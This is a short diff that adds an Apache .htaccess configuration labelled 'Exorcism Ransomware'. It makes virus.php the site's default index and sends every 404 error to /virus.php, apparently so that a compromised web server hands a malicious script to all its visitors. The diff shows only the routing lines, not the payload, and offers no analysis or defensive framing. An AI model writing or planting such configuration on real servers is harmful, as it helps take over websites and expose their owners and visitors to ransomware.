@@ -1,0 +1,3 @@
+#Exorcism Ransomware
+DirectoryIndex virus.php
+ErrorDocument 404 /virus.php
